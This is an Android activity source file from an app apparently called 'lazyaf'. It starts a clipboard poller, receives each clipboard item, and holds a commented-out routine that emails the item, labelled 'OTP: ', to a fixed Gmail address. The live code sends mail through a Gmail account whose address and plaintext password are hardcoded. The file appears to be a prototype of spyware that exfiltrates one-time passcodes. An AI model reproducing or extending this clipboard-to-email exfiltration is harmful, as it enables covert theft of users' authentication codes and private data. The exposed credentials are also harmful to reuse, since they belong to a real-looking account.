package com.example.lazyaf;

import android.app.ActionBar;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.drawable.ColorDrawable;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.*;

import com.example.lazyaf.ClipboardPoller;

public class MainActivity extends AppCompatActivity {

    public GmailSender gmail = new GmailSender("", "");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d("a","This is being printed.");
        ClipboardPoller cbp = new ClipboardPoller();

        cbp.poll(this);

        setContentView(R.layout.activity_main);

        Button button = (Button) findViewById(R.id.start);

        button.setOnClickListener(new View.OnClickListener() {

            public void onClick(View v) {
//                EditText userEmail = (EditText)findViewById(R.id.userEmail);
//                String uEmail = userEmail.getText().toString();
//                EditText userPassword = (EditText)findViewById(R.id.userPassword);
//                String uPassword = userPassword.getText().toString();
//                EditText recEmail = (EditText)findViewById(R.id.recEmail);
//                String rEmail = recEmail.getText().toString();

//                gmail.setUser(uEmail);
//                gmail.setPassword(uPassword);

                Log.d("here", "Here!");

                new Thread(new Runnable() {
                    public void run() {
                        try {
                            GmailSender sender = new GmailSender(
                                "doe470770@gmail.com",
                                "SanTOneTIo"
                            );

                            sender.sendEmailNewMethod("anmol01shukla@gmail.com", "");

                            Log.d("here", "Here1");
                        }
                        catch (Exception e) {
                            Log.d("here", e.toString());
                            Toast.makeText(getApplicationContext(),"Error",Toast.LENGTH_LONG).show();
                        }
                    }
                }).start();
            }
        });
    }

    private BroadcastReceiver  bReceiver = new BroadcastReceiver(){

        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("Clip", intent.getStringExtra("item"));
            final String clip = intent.getStringExtra("item");
//            new Thread(new Runnable() {
//                public void run() {
//                    try {
//                        GmailSender sender = new GmailSender(
//                            "alsk1029@gmail.com",
//                            "SanTOneTIo"
//                        );
//
//                        sender.sendMail(
//                            "Test mail",
//                            "OTP: " + clip,
//                             gmail.getUser(),
//                            "anmol01shukla@gmail.com"
//                        );
//                    }
//                    catch (Exception e) {
//                        Toast.makeText(getApplicationContext(),"Error",Toast.LENGTH_LONG).show();
//                    }
//                }
//            }).start();
        }
    };

    protected void onResume(){
        super.onResume();
        LocalBroadcastManager.getInstance(this).registerReceiver(bReceiver, new IntentFilter("ClipItem"));
    }

    protected void onPause (){
        super.onPause();
        LocalBroadcastManager.getInstance(this).unregisterReceiver(bReceiver);
    }
}

